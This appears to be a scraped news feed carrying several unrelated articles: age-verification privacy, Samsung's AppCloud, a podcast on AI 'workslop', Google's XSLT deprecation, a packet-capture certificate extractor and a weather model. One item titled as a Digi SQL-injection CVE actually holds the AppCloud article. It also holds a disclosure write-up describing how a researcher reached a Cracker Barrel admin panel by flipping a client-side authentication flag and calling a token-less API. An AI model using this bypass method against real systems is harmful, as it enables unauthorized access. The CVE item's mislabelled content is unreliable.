of online ID checkpointsAge verification started as a moral crusade. Lawmakers wanted to protect minors from explicit material. However, every system that requires an ID online transforms into something else entirely: a surveillance checkpoint. To prove you’re an adult, you hand over the same information criminals and governments dream of having—and to a patchwork of private vendors who store it indefinitely.We’ve already seen where that leads. In the UK, after age-gating rules took effect under the Online Safety Act, one of the verification companies was breached. In the US, the AU10TIX breach exposed user data from Uber, X, and TikTok. Each time, the same story: people forced to upload passports, driver’s licenses, or selfies, only to watch that data leak.If hackers wanted to design a dream scenario for mass identity theft, this would be it. Governments legally requiring millions of adults to upload the exact documents criminals need.The irony is that none of this actually protects children. In the UK, VPN sign-ups spiked 1,400% the day the new restrictions went live. We hope that’s from adults balking at handing over personal data, but the point is any teen with a search bar can bypass an age-gate in minutes. The result isn’t a safer internet—it’s an internet that collects more data about adults while pushing kids toward sketchier, unregulated corners of the web.Parents already have better options for keeping inappropriate content at bay: device-level controls, filtered browsers, phones built for kids. None of those require turning the rest of us into walking ID tokens.Defenders like to compare online verification to showing ID at a bar. But when you flash your license to buy a beer, the cashier doesn’t scan it, store it, and build a permanent record of your drinking habits. Online verification does exactly that. Every log-in becomes another data point linking your identity to what you read, watch, and say.It’s not hard to imagine how this infrastructure expands. Today it’s porn, violence, and “mature” chatbots. Tomorrow it could be reproductive-health forums, LGBTQ+ resources, or political discussion groups flagged as “sensitive.” Once the pipes exist, someone will always find a new reason to use them.When innovation starts to feel invasiveLet’s be honest. We could all make money if we just decided to build porn machines, and that’s what this new offering from ChatGPT feels like. It didn’t take long for AI to grab a slice of the OnlyFans market. Except the price of admission isn’t only $20 a month; it’s potentially your identity and a whole lot of heartache.“Once you are asked to give certain types of information to a website, there’s no way to know what that company, who’s supposedly verifying your age, is doing with that information.” The verification process itself becomes a form of surveillance, creating detailed records of legal adult behavior that governments and cybercriminals can exploit.This is how surveillance gets normalized: one “safety” feature at a time. ChatGPT’s erotic mode will make ID-upload feel routine—a casual step before chatting with your favorite AI companion. But beneath the surface, those IDs will feed a new class of data brokers and third-party verifiers whose entire business depends on linking your real identity to everything you do online.We’ve reached the point where governments and corporations don’t need to build a single centralized database; we’re volunteering one piece at a time.ChatGPT’s latest intentions are a preview of what’s next. The internet has been drifting toward identity for years—from social logins to verified profiles—and AI is simply accelerating that shift. What used to be pockets of anonymity are becoming harder to find, replaced by a web that expects to know exactly who you are.The future of “safe” online spaces shouldn’t depend on handing over your driver’s license to an AI.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>CVE-2025-13319 - Authenticated SQL injection in API - Digi On-Prem Manager</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13319</link><author></author><category>vulns</category><pubDate>Mon, 17 Nov 2025 17:15:48 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13319

Despite its name, AppCloud isn’t a cloud storage service. It’s essentially an app-installer that surfaces third-party app recommendations during device setup.
On new Galaxy devices in these lineups, AppCloud appears as part of the initial onboarding and forces users to choose whether they want to install certain apps before setup can be completed. You can postpone this by choosing the “later” option, but the app continues to push a persistent notification until you finish the selection process or disable it entirely. For most users, AppCloud has long been regarded as little more than nuisance bloatware, a side effect of Samsung’s need to generate revenue beyond hardware margins while competing with aggressive Chinese smartphone brands in India.But findings by the non-profit SMEX from earlier this year suggest AppCloud may not be as harmless as once assumed.
AppCloud expansion into Asian and African markets has sparked scrutinySince 2022, Samsung has also been preloading AppCloud on its A and M series phones in several West Asian and North African (WANA) markets. This rollout has triggered privacy concerns due to AppCloud’s ties to ironSource, a company founded in Israel and now owned by US-based Unity.
While AppCloud can be disabled, it is difficult to remove without root access. Furthermore, its privacy policy is not easily available online, raising questions about transparency, user consent, and what kind of data the app may collect.ironSource itself has a controversial track record. The company previously operated an “InstallCore” program that became infamous for installing software without clear user permission and for bypassing security warnings, behavior that resulted in widespread criticism and blacklisting by several anti-malware tools.
Regional sensitivities make things more contentiousThe presence of an Israeli-origin technology component on Samsung phones in WANA countries poses additional problems. Several nations in this region legally bar Israeli companies from operating, and in light of the ongoing Israel–Palestine conflict, the preload of an app tied to such a company becomes even more contentious.ironSource’s Aura technology, which “optimizes device experiences” by surfacing apps, content, and services directly on smartphones, has been used on Samsung devices in Europe, Russia, and Southeast Asia, and by telecom operators in the US; it also appears to do something similar to AppCloud. However, AppCloud itself is not listed anywhere on ironSource’s website, which appears to be the major cause for concern, even though the app is now owned by a US company.
While there’s no concrete evidence that AppCloud engages in questionable data practices today, the lack of an accessible privacy policy and ironSource's past reputation are causing anxiety among users.
People want Samsung to respondConsumer advocates and privacy-focused users are urging Samsung to take immediate steps, like providing a clear opt-out for AppCloud during setup, making its privacy policy public and accessible, and to stop preloading the app entirely in sensitive regions.
With concerns rising across multiple markets, Samsung will likely need to issue a statement to reassure customers. We have reached out to the company for comment and will update this story once we hear back.

After seeing them in the news so much, a thought came to mind: are they secure? I set out to find out! After poking around, I found a way to get into their rewards admin panel. Here is how I did it.The Cracker Barrel rewards currency is “pegs”. It’s named after the famous peg game. Essentially, pegs are rewards points. $1 spent = 1 peg. You can redeem your pegs online or in-store for food, drinks, etc.That’s really all there is to it. You can click the header link to learn more if you’d like.I came across an admin panel for the rewards. It is a corporate site and not a consumer site, so only Cracker Barrel employees are supposed to be able to get into it.It was a simple React JS app and you could see how the login worked by looking at :Looking closely, I saw an easy potential bypass method: setting the initial “isAuthenticated” value to true. One change in the compiled JS……and that was enough to get into the site! Sometimes it really is that simple.From here, you could manage the rewards and the associated peg values:That is pretty much it for the good stuff. Nothing sensitive was exposed and no customer data was at risk. The worst thing that could have happened would have been potential business disruption to the rewards system, or inflating your own rewards by modifying items you would then buy. No write actions were performed. While it looked possible to adjust production rewards, I opted to not test it since there’s probably a lot of rewards activity every second, so any brief change could have led to problems. It looks like they had the right idea for the auth – the code below sends an authorization token. Since I did not have one, I left it blank, so no token was sent. The API server would accept requests without a token, and that is where the vulnerability was.This time, I decided to give a third-party VDP a try that came recommended. I submitted it October 25, 2025. By the time I heard back on November 17, 2025, Cracker Barrel appeared to have noticed the vulnerability and fixed it themselves. As a result, no further action was required. It was cool to see a company proactively notice and fix a vulnerability so quickly!]]></content:encoded></item><item><title>Your coworker is tired of AI &amp;#8220;workslop&amp;#8221; (Lock and Code S06E23)</title><link>https://www.malwarebytes.com/blog/podcast/2025/11/your-coworker-is-tired-of-ai-workslop-lock-and-code-s06e23</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 15:44:24 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[This week on the Lock and Code podcast…Everything’s easier with AI… except having to correct it. In just the three years since OpenAI released ChatGPT, not only has onlife life changed at home—it’s also changed at work. Some of the biggest software companies today, like Microsoft and Google, are forwarding a vision of an AI-powered future where people don’t write their own emails anymore, or make their own slide decks for presentations, or compile their own reports, or even read their own notifications, because AI will do it for them. But it turns out that offloading this type of work onto AI has consequences.In September, a group of researchers from Stanford University and BetterUp Labs published findings from an ongoing study into how AI-produced work impacts the people who receive that work. And it turns out that the people who receive that work aren’t its biggest fans, because it’s not just work that they’re having to read, review, and finalize. It is, as the researchers called it, “workslop.”“AI generated work content that masquerades as good work, but lacks the substance to meaningfully advance a given task. It can appear in many different forms, including documents, slide decks, emails, and code. It often looks good, but is overly long, hard to read, fancy, or sounds off.”Far from an indictment on AI tools in the workplace, the study instead reveals the economic and human costs that come with this new phenomenon of “workslop.” The problem, according to the researchers, is not that people are using technology to help accomplish tasks. The problem is that people are using technology to create ill-fitting work that still requires human input, review, and correction down the line.“The insidious effect of workslop is that it shifts the burden of the work downstream, requiring the receiver to interpret, correct, or redo the work,” the researchers wrote. Today, on the Lock and Code podcast with host David Ruiz, we speak with Dr. Kristina Rapuano, senior research scientist at BetterUp Labs, about AI tools in the workplace, the potential lost productivity costs that come from “workslop,” and the sometimes dismal opinions that teammates develop about one another when receiving this type of work.“This person said, ‘Having to read through workshop is demoralizing. It takes away time I could be spending doing my job because someone was too lazy to do theirs.'”Tune in today to listen to the full conversation.Listen up—Malwarebytes doesn’t just talk cybersecurity, we provide it.]]></content:encoded></item><item><title>Google is killing the open web, part 2</title><link>https://wok.oblomov.eu/tecnologia/google-killing-open-web-2/</link><author>akagusu</author><category>dev</category><pubDate>Mon, 17 Nov 2025 15:41:08 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I wrote a few months ago about the proxy war by Google against the open web by means of XSLT.
Unsurprisingly, Googlehas been moving forward on the deprecation,
still without providing a solid justification on the reasons why other than
“we've been leeching off a FLOSS library for which we've finally found enough security bugs to use as an excuse”.
They do not explain why they haven't decided to fix the security issues in the library instead,
or adopt a more modern library written in a safe language, taking the opportunity to upgrade XSLT support
to a more recent, powerful and easier-to-use revision of the standard.Instead, what they do is to provide a “polyfill”, a piece of JavaScript that can allegedly used to supplant the functionality.
Curiously, however, they do  plan to ship such alternative in-browser,
which would allow a transparent transition without even a need to talk about XSLT .
No, they specifically refuse to do it, and instead are requesting anyone still relying on XSLT to
replace the invocation of the XSLT with a  invocation of the JavaScript polyfill that should replace it.This means that at least one of these two things are true:the polyfill is not, in fact, sufficient to cover all the use cases previously covered by the built-in support for XSLT,
and insofar as it's not, they (Google) do not intend to invest resources in maintaining it,
meaning that the task is being dumped on web developers
(, Google is removing a feature that is going to create
 for web developers just to provide the same functionality that they used to have from the browsers);insofar as the polyfill is sufficient to replace the XSLT support in the browser,
the policy to not ship it as a replacement confirms that the security issues in the XSLT library used in Chrome
were nothing more than excuses to give the final blow to RSS and any other XML format
that is still the backbone of an independent web.Actions, as they say, speak louder than words.
When a company claims that a service or feature they are removing can be still accessed by other means,
but do not streamline such access said alternative,
and instead require their users to do the work necessary to access it,
you can rest assured that beyond any word of support they may coat their actions with
there is a plain and direct intent at sabotaging said feature,
and you can rest assured that any of the excuses brought forward to defend the choice
are nothing but lies to cover a vested interest in sabotaging the adoption of the service or feature:
the intent is for you to  use that feature at all, because they have a financial interest in you  using it.And the best defense against that is to attack, and push the use of that feature even harder.
Do not install the polyfill.
Do not change your XML files to load it.
Instead, flood their issue tracker with requests to bring back in-browser XSLT support.
Report failed support for XSLT as a broken in browsers, because this is not a website issue.

As I have for  continued using MathML, SVG and SMIL
(sometimes even all together) despite Google's intent on their deprecation,
I will keep using XSLT, and in fact will look for new opportunities to rely on it.
At most, I'll set up an infobox warning users reading my site about their browser's potential brokenness
and inability to follow standards, just like I've done for MathML and SMIL
(you can see such infoboxes in the page I linked above).
And just like ultimately I was proven right
(after several years, Google ended up fixing both their SMIL and their MathML support in Chrome),
my expectation is that, particularly with more of us pushing through,
the standards will once again prevail.Remember: there is not technical justification for Google's choice.
This is not about a lone free software developer donating their free time to the community
and finding they do not have the mental or financial resources to provide a particular feature.
This is a trillion-dollar ad company who has been actively destroying the open web
for over a decade and finally admitting to it
as a consequence of the  push
and intentional [enshittification of web search]404mediaSearch.The deprecation of XSLT is entirely political,
fitting within the same grand scheme of the parasitic corporation killing the foundations of its own success
in an effort to grasp more and more control of it.
And the fact that the WebKit team at Apple
and the Firefox team at Mozilla
are intentioned to follow along on the same destructive path is not a counterpoint,
but rather an endorsement of the analysis,
as neither of those companies is interested in providing a User AgentIf you have to spend any time at all to confront the Chrome push to deprecate XSLT,
your time is much better spent inventing better uses of XSLT
and reporting broken rendering if/when they start disabling it,
than caving to their destructive requests.The WHATWG is not a good steward of the open webI've mentioned it before,
but the WHATWG, even assuming the best of intentions at the time it was founded,
is not a good steward of the open web.
It is more akin to the corrupt takeover you see in regulatory capture,
except that instead of taking over the W3C
they just decided to get the ball and run with it,
taking advantage of the fact that, as implementors,
they had the final say on what counted as “standard”
( if not ):
exactly the same attitude with which Microsoft tried taking over the web
through Internet Explorer at the time of the First browser war,
an attitude that was rightly condemned at the time
—even as many of those who did, have so far failed to acknowledge the problem
with Google's no less detrimental approach.The key point here is that,
whatever the WHATWG was (or was intended to be)
when it was founded by Opera and Mozilla developers,
it is now manifestly a corporate monster.
Their corporate stakeholder have a very different vision of what the Web should be
compared to the vision on which the Web was founded, the vision promoted by the W3C,
and the vision that underlies a truly open and independent web.The WHATWG aim is to turn the Web into an application delivery platform,
a profit-making machine for corporations where the computer
(and the browser through it)
are a means for  to make money off 
rather than for  to gain access to services you may be interested in.
Because of this, the browser in their vision is not a User Agent anymore,
but a tool that sacrifices privacy, actual security and user control
at the behest of the corporations “on the other side of the wire”
—and of their political interests
(refs. for Apple, Google,
and a more recent list with all of them together).Such vision is in direct contrast with that of the Web as a
, a vast vault of interconnected 
whose value emerges from organic connections, personalization,
variety, curation and .
But who in the WHATWG today would defend such vision?Maybe what we need is a new browser war.
Not one of corporation versus corporation
—doubly more so when all currently involved parties are allied
in their efforts to enclose the Web than in fostering an open and independent one—
but one of users versus corporations,
a war to take  control of the Web and its tools.It's kind of ironic that in a time when  has become almost trivial,
the fight we're going to have to fight is going to be on the  side.
But the biggest question is: who do we have as champions on our side?I would have liked to see browsers like Vivaldi,
the spiritual successor to my beloved classic Opera browser,
amongst our ranks,
but with their dependency on the Blink rendering engine, controlled by Google,
they won't be able to do anything but cave,
as will all other FLOSS browsers relying on Google's or Apple's engines,
none of which I foresee spending any significant efforts rolling back the extensive changes that these deprecations will involve.
(We see this already when it comes to JPEG XL support,
but it's also true that e.g. Vivaldi has made RSS feeds first-class documents,
so who knows, maybe they'll find a way for XSLT through the polyfill that was mentioned above,
or something like that?)Who else is there?
There is Servo, the rendering engine that was being developed at Mozilla to replace Gecko,
and that turned into an independent project when its team was fired in 2020;
but they don't support XSLT yet,
and I don't see why they would prioritize its implementation over, say, stuff like MathML or SVG animations with SMIL
(just to name two of my pet peeves), or optimizing browsing speed
(seriously, try opening the home page of this site and scrolling through).What we're left with at the moment is basically just Firefox forks,
and two of these (LibreWolf and WaterFox)
are basically just “Firefox without the most egregious privacy-invasive misfeatures”,
which leaves the question open about what they will be willing to do when Mozilla helps Google kill XSLT,
and only the other one, Pale Moon, has grown into its own independent fork
(since such an old version of Firefox, in fact, that it doesn't support WebExtensions-based plugins,
such as the most recent versions of crucial plugins like uBlock Origin or Privacy Badger,
although it's possible to install community-supported forks of these plugins designed
for legacy versions of Firefox and forks like Pale Moon).(Yes, I am aware that there are other minor independent browser projects,
like Dillo and Ladybird,
but the former is in no shape of being a serious contender for general use
on more sophisticated pages —just see it in action on this site, as always—
and the latter is not even in alpha phase,
just in case the questionable “no politics” policies
—which consistently prove to be weasel words for “we're right-wingers but too chicken to come out as such”—
weren't enough to stay away from it.)Periodically, I go through them (the Firefox forks, that is) to check if they are good enough for me to become my daily drivers.
Just for you (not really: just for me, actually), I just tested them again.
They're not ready yet, at least not for me, although I must say that I'm seeing clear improvements since my last foray into the matter,
that wasn't even that long ago.
In some cases, I can attest that they are even better than Firefox:
for example, Pale Moon and WaterFox have good JPEG XL support
(including transparency and animation support,
which break in LibreWolf as they do in the latest nightly version of Firefox I tried),
and Pale Moon still has first-class support for RSS,
from address bar indicator to rendering even in the absence of a stylesheet
(be it CSS or XSLT).An interesting difference is that the user interface of these browsers is perceivably less refined than Firefox'.
It's a bit surprising, given the common roots,
but it emerges in several more and less apparent details,
from the spacing between menu items to overlapping text and icons in context menus,
passing through incomplete support for dark themes and other little details that all add up,
giving these otherwise quite valid browsers and amateurish feeling.And I get it: UI design is hard, and I myself suck at it, so I'm the last person that should be giving recommendations,
but I'm still able to differentiate between more curated interfaces and ones that need some work;
and if even someone like me who distinctly prefers function over form finds these little details annoying,
I can imagine how much worse this may feel to users who care less about the former and more about the latter.
Sadly, if a new browser war is to be fought to wrestle control from the corporate-controlled WHATWG,
.In the end, I find myself in a “waiting” position.
How long will it take for Firefox to kill their XSLT support?
What will its closest forks
(WaterFox in particular is the one I'm eyeing)
be able to do about it?
Or will Pale Moon remain the only modern broser with support for it,
as a hard fork that has since long gone its own way?
Will they have matured enough to become my primary browsers?
We'll see in time.There's more to the Internet than the World Wide Web built around the HTTP protocol and the HTML file format.
There used to be  of the Internet beyond the Web,
and while much of it still remains as little more than a shadow of the past,
largely eclipsed by the Web and what has been built on top of it
(not all of it good) outside of some modest revivals,
there's also new parts of it that have tried to learn from the past,
and build towards something different.This is the case for example of the so-called “Gemini Space”,
a small corner of the Internet that has nothing to do with the LLM Google is trying to shove down everyone's throat,
and in fact not only predates it, as I've mentioned already,
but is intentionally built around dfferent technology to  from the influence of Google and the like.The Gemini protocol is designed to be conceptually simpler than HTTP,
while providing modern features like built-in transport-level security
and certificate-based client-side authentication,
and its own “native” document format, the so-called gemtext.
There's something to be said about not wanting to share your environment with the poison that a large part of the web has become,
but at the same time, there's also something to be said about throwing away the baby with the bathwater.
The problem with the web isn't technical, it's social. The tech itself is fine.
I'm not going to sing the praises of the Gemini protocol or gemtext either,
even though I do like the idea of a web built on lightweight markup formats:
I would love it if browsers had native support for formats like
Markdown or AsciiDoc (and gemtext, for the matter):
it's why I keep the AsciiDoctor Browser Extension installed.But more in general, the Web (or at least its user agents) should not differentiate.
It should not differentiate by protocol, and it should not differentiate by format.
We've seen it with image formats like MNG being unfairly excluded,
with [motivations based on alleged code bloat][nomng] that today are manifest in their idiocy
(and yes, it hasn't escaped my that even Pale Moon doesn't support the format),
and we're seeing it today with JPEG XL threatened with a similar fate,
without even gracing us with a ridiculous excuse.
On the upside, we have browsers shipping with a full-fledged PDF reader,
which is a good step towards the integration of this format with the greater Web.In an ideal world, browsers would have not deprecated older protocols
like Gopher or FTP,
and would just add support for new ones like Gemini,
as they would have introduced support for new (open) document formats as they came along.A Web of interconnected software?It shouldn't be up to the User Agent to determine which formats the user is able to access, and through which protocol.
(If I had any artistic prowess (and willpower), I'd hack the “myth of consensual X” meme
representing the user and the server saying “I consent”, and the browser saying “I don't”.)
I do appreciate that there is a non-trivial maintenance cost that grows with the number of formats and protocols,
but we know from classic Opera that it is indeed quite possible
to ship a full Internet suite in a browser packaging.In the old days, browser developers were well-aware that a single vendor couldn't “cover all bases”,
which is how interfaces like the once ubiquituous NPAPI were born.
The plug-in interface has been since removed from most browsers,
an initiative again promoted by Google, announced in 2013 and completed in 2015
(I should really add this to my previous post on Google killing the open web,
but I also really don't feel like touching that anymore; here will have to suffice),
with the other major browsers quickly following suit,
and its support is now relegated only to independent browsers like Pale Moon.And even if it can be argued that the NPAPI specifically was indeed mired with unfixable security and portability issues and it had to go,
its removal without a clear cross-browser upgrade path has been ,
destroying the primary “escape hatch” to solve the chicken-and-egg problem of client-side format support versus server-side format adoption.
By the way, it was also responsible for the biggest W3C blunder,
the standardization of  for the web through the so-called
Encrypted Media Extensions, a betrayal of the W3C own mission statement.The timeline here is quite interesting, and correlates with the already briefly mentioned history of Flash,
and its short-lived Microsoft Silverlight competitor, that were largely responsible for
the early expansive growth of multimedia streaming services in the early years of the XXI century:
with the tension between Apple's effort to kill Flash
and the need of emerging streaming services like Netflix' and Hulu's
to support in-browser multimedia streaming,
there was a need to improve support for multimedia formats in the nascent HTML5 specification,
but also a requirement from the  partners
that such a support would allow enforcing the necessary restrictions that would, among other things, prevent users from saving a local copy of the stream,
something that could be more easily enforced within the Flash players the industries had control over
than in a  controlled by .This is where the development of  came in in 2013:
this finally allowed a relatively quick phasing out of the Flash plugin,
and  of the plugin interface that allowed its integration with the browsers:
by that time, the Flash plugin was by and large  plugin the API existed for,
and the plugin itself was indeed still supported by the browsers for some time after support for the API was otherwise discontinued
(sometimes through alternative interfaces such as the PPAPI,
other times by keeping the NPAPI support around, but only enabled for the Flash plugin).There are several interesting consideration that emerge from this little glimpse at the history of Flash and the EME.First of all,
this is one more piece of history that goes to show how pivotal the year 2013 was for the enshittification of the World Wide Web,
as discussed already.Secondly,
it shows how the developers of major browsers are more than willing to provide a smooth transition path with no user intervention,
at least when catering to the interests of major industries.
This indicates that when they don't, it's not because they :
it's because they have a vested interest in not doing it.
Major browser development is now (and has been for over a decade at least)
beholden not to the needs and wants of ,
but to those of other industries.
But I repeat myself.And thirdly, it's an excellent example, for the good and the bad, of how the plugin interface has helped drive the evolution of the web,
as I was saying.The removal of NPAPI support,
followed a few years later by the removal of the (largely Chrome-specific) PPAPI interface
(that was supposed to be the “safer, more portable” evolution of NPAPI),
without providing  alternative,
is a very strong indication of the path that browser development has taken in the last “decade plus”:
a path where the Web is entirely controlled by what Google, Apple and Microsoft
(hey look, it's GAFAM all over again!) decide about what is allowed on it,
and what is  allowed to  be on it (to wit, ads and other user tracking implements).With plugins,  could be integrated in the World Wide Web,
and such integration would be close to as efficient as could be.
Without plugins, such integration, when possible at all,
becomes clumsier and more expensive.As an example, there are browser extensions that can introduce support for JPEG XL to browsers that don't have native support.
This provides a workaround to display such images in said browsers,
but when a picture with multiple formats is offered
(which is what I do e.g. to provide a PNG fallback for the JXL images I provide),
this results in  the PNG  JXL formats being downloaded,
 the amount of data transferred instead of decreasing it
(one of the many benefits of JXL over PNG).
By contrast, a plugin could register itself a handler for the JPEG XL format,
and the browser would then be able to delegate rendering of the image to the plugin,
only falling back to the PNG in case of failure,
thus maximizing the usefulness of the format pending a built-in implementation.The poster child of this lack of efficiency is arguably MathJax,
that has been carrying for nearly two decades the burden of bringing math to the web while browser implementors slacked off on their MathML support.
And while MathJax  offer more than just MathML support for browers without native implementations,
there is little doubt that it would be more effective in delivering the services it delivers
if it could be a plugin rather than a multi-megabyte
(any efforts to minimize its size notwithstanding)
JavaScript library each math-oriented website needs to load.(In fact, it is somewhat surprising that there isn't a browser extesion version of MathJax that I can find
other than a GreaseMonkeyuser script with convoluted usage requirements,
but I guess this is the cost we have to pay for the library flexibility,
and the sandboxing requirements enforced on JavaScript in modern browsers.)Since apparently “defensive writing” is a thing we need when jotting down an article such as this
(as if it even matters, given how little attention people give to what they read —if they read it at all— before commenting),
I should clarify that I'm not necessarily for a return to NPAPI advocating.
We have decades of experience about what could be considered the actual technical issues with that interface,
and how they can be improved upon
(which is for example what PPAPI allegedly did,
before Google decided it would be better off to kill plugins entirely
and thus gain full control of the Web as a platform),
as we do about sandboxing external code running in browsers
(largely through the efforts to sandbox JavaScript).
A better plugin API could be designed.It's not going to happen.
It is now apparent that the major browsers explicitly and intentionally do not want to allow the kind of flexibility that plugins would allow,
hiding their controlling efforts behind security excuses.
It would thus be up to the minority browsers to come up with such an interface
(or actually multiple ones, at least one for protocols and one for document types),
but with most of them beholden to the rendering engines controlled by Google
(for the most part), Apple (some, still using WebKit over Blink), and Mozilla (the few Firefox forks),
they are left with very little leeway, if any at all, in terms of what they can support.But even if, by some miraculous convergence, they did manage to agree on and implement support for such an API,
would there actually be an interest by third party to develop plugins for it?
I can envision this as a way for browsers to share coding efforts in supporting new protocols and formats before integrating them as first-class
(for example, the already mentioned Gemini protocol and gemtext format could be implemented first as a plugin
to the benefit of any browsers supporting such hypothetical interfaces)
but there be any interest in developing for it, rather tha just trying to get the feature implemented in the browsers themselves?A mesh of building blocksStill, let me dream a bit of something like this,
a browser made up of composable components,
protocol handlers separate from primary document renderers separate from attachment handlers.Implement a plugin to handle that, and you can test it by delivering the same content over it,
and see it rendered just the same from the other components in the chain.Implement a plugin to handle that, and it will be used to render documents in the new format.Implement a plugin to handle that, and any image in the new format will be visible.You guessed it: implement a plugin to handle that …How much tech would have had a real chance at proving itself in the field if this had been the case,
or would have survived being ousted not by technical limitations,
but by unfriendly corporate control?
Who knows, maybe
RSS and Atom integration would still be trivially at everybody's hand;
nobody would have had to fight with the long-standing bugs in PNG rendering from Internet Explorer,
MNG would have flourished, JPEG XL would have become ubiquituous six months after the specification had been finalized;
we would have seen HTML+SMIL provide declarative interactive documents without JavaScript as far back as 2008;
XSLT 2 and 3 would have long superseded XSLT 1 as  templating languages for the web,
or XSLT would have been supplanted by the considerably more accessible XQuery;
XHTML2 would have lived and grown alongside HTML5,
offering more sensible markup for many common features,
and much-wanted capabilities such as client-side includes.The web would have been very different from what it is today,
and most importantly we would never would have had to worry
about a single corporation getting to dictate what is and what isn't allowed on the Web.But the reality is much harsher and darker.
Google has control, and we do need to wrestle it out of their hands.So, do not comply.
Resist.
Force the unwanted tech through.
Use RSS.
Adopt JPEG XL as your primary image format.
And report newly broken sites for what they are:
a browser fault, not a content issue.I would like to add here any  for XSLT.xslt.rip (best viewed with a browser that supports XSLT; viewing the source is highly recommended);and last but not least (yeah I know, doesn't make much sense with the current short list, but still),
a shameless plug of my own website, of course,
because of the idea to use XSLT not to produce HTML, but to produce SVG.Made the news (and other related articles)I've apparently “made the news” (again).I have read the comments, and little has changed since last time.
The only comment worth responding is from the user that prefers EME to the mess of plugins we used to have.
I understand where they are coming from, but I disagree on a matter of principle:
DRM shouldn't exist, and it should never have been standardized in violation of the W3C mission statement;
as a plus, and the more cumbersome it is for the user, the better it represents its negative nature.Aside from that, the comments keep missing the point,
and weight their personal dislike for XSLT more than the important role it plays on the open and indie web.
Just seeing how many people follow the corporate recommendation to apply it server-side and distribute the
“rendered” HTML shows these are people who have no idea what they're talking about:
just as an example,
my sparklines are still 10× smaller as XML data plus XSLT than as the rendered SVG,
with benefits amortizing over multiple sparklines per page
(due to common XSLT), and over time
(data changes, XSLT does not; also, the actual ratio of SVG to XML data is much higher that 10×,
and as data increases, the ratio tends to ).
For smaller, cheaper and/or home hosting, XSLT remains a clear winner.You don't like the syntax? Fine.
But use that energy to pressure for XQuery to be available
instead of towing the corporate line about the demise of XSLT.]]></content:encoded></item><item><title>PacketSmith X.509 Certificate Extractor (TLS over TCP and DTLS) - How To</title><link>https://packetsmith.ca/certificate_extractor/</link><author>/u/MFMokbel</author><category>netsec</category><pubDate>Mon, 17 Nov 2025 15:22:43 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Release 4.0 introduces a new capability: the scanning of TCP and UDP streams for x.509 certificates. You can now either export these certificates to disk or dissect their attributes and output them as JSON objects and arrays. It checks for certificates in all the streams that start with a TLS Handshake content type, and for handshakes of type Certificate. s. For the TCP protocol, the  is invoked to reconstruct valid streams. The scanning process against the TCP and UDP protocols is port-independent.The process of locating X.509 certificates in a pcap is not as simple as scanning the entire pcap payload or a packet for specific certificate constants and extracting them. On the contrary, the identification of such a certificate follows a strict set of rules for the TCP and UDP protocols.For the TCP protocol, and because of MTU limitations, with the possibility that a certificate might span more than one packet, TCP stream calculation becomes a necessity. And, working with TCP streams is not enough, because of packet retransmission, out-of-order packets, and other similar network behaviour. The latter necessitates the implementation of a TCP reassembly engine to handle such types of network behaviour, which is not an easy task.Once you have all the essential building blocks implemented up to the network layer, working with reassembled TCP streams and searching for certificates is another subtle task. This requires searching in an optimized fashion, all streams that start with a TLS/SSL Handshake (0x16) content type, containing handshakes of type Certificate (0x0b). From this point on, we extract the Certificate record layer certificate header to extract all certificates.For UDP and in case of handshake fragmentation, the TLS protocol uses fragments with sequence number, offset and length fields; consequently, those fragments have to be reassembled at the UDP stream level before scanning for certificates.We implemented a custom ASN.1 DER certificate parser to handle the parsing and validation of the acquired certificates. This tool dissects all certificate attributes, including various extensions. The extracted data is then exported as a detailed, organized, and hierarchical JSON array for both TCP and UDP streams. The extractor is highly reliable, making it unlikely to produce false positives (treating an invalid certificate as valid) or false negatives (missing a valid certificate).The TCP reassembly engine can be turned off and instead switch to payload concatenation of all packets in the stream. Based on our testing, the difference in performance for large pcaps is considerable. Moreover, even the stream’s directionality can be specified in the configuration file, up (c->s), down (s->c) or duplex (c< – >s).To demonstrate the performance difference, take the following pcap  (fsize: 55.5 MB; sha-1: 5b822dc38f8b97f0b966bce4601cf73cb40afbd1) as an example. According to PacketSmith’s calculation, it consists of 15227 streams, with 12469 being TCP-IPv4 and 2758 being UDP-IPv4. A total of 129 X.509 certificates are located exclusively in the TCP-IPv4 streams.With the TCP reassembly engine on, it takes about 7860_ms to dump all the certificates to a folder on disk, and around 5370_ms with the TCP reassembly engine off; A performance improvement of ~32%.The automated search, location, extraction, and subsequent dissection of X.509 certificates within packet captures is a fundamental requirement for creating fine-grained Intrusion Prevention/Detection System (IPS/IDS) rules. These policies leverage various certificate attributes, a methodology further explored in our research paper, . This is why we add additional metadata to every dissected certificate in the JSON object, such as the entropy, fingerprints against the certificate payload and the public key, and field-level dissection of the subject and issuer attributes.Let’s take the TLS over TCP traffic  (fsize: 2499 bytes) generated by  (Adversary Emulation Framework) as an example. The pcap consists of one TCP stream over TLS v1.2, with 20 packets in total.To extract all the certificates from the pcap, we execute the following PacketSmith cmd line option:Using the option , the above command will export all found certificates to the folder/Output path “C:\Users\PS\Desktop\certs”, under the filename with the format pattern:The metadata in the filename is specific to the stream id where the certificate is found. For example,And the output message you get from PacketSmith once the above command is successfully executed is the following:- a total of 1 x.509 DER certificate was dumped to C:\Users\PS\Desktop\certs– TCP-IPv4 -> 1– TCP-IPv6 -> 0– UDP-IPv6 -> 0To dump the JSON dissection of the certificate to the console, we use a similar command:Which outputs a JSON object similar to this:]]></content:encoded></item><item><title>WeatherNext 2: Our most advanced weather forecasting model</title><link>https://blog.google/technology/google-deepmind/weathernext-2/</link><author>meetpateltech</author><category>dev</category><pubDate>Mon, 17 Nov 2025 15:04:26 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Weather predictions need to capture the full range of possibilities — including worst case scenarios, which are the most important to plan for.WeatherNext 2 can predict hundreds of possible weather outcomes from a single starting point.

